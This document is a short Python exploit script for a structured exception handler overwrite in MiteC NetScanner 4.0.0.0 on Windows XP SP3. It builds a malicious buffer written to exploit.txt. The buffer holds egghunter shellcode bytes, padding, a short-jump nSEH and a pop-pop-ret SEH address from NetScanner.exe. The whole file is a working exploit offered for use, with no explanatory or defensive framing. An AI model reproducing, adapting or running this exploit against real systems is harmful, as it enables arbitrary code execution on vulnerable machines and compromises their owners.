# Exploit for MiteC NetScanner 4.0.0.0 - Egghunter1
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
file = open("exploit.txt", "wb")

egghunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x57\x30"
"\x30\x54\x8b\xfa"
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

junk1 = "A" * 10
junk2 = "A" * (66-len(egghunter))
nseh  = "\xeb\xb4\x41\x41"  # jmp -74
seh   = "\x19\x71\x40"      # 0x00407119 : pop ecx # pop ebp # ret 0x04 NetScanner.exe

buffer = junk1 + egghunter + junk2 + nseh + seh

file.write(buffer)
file.close()
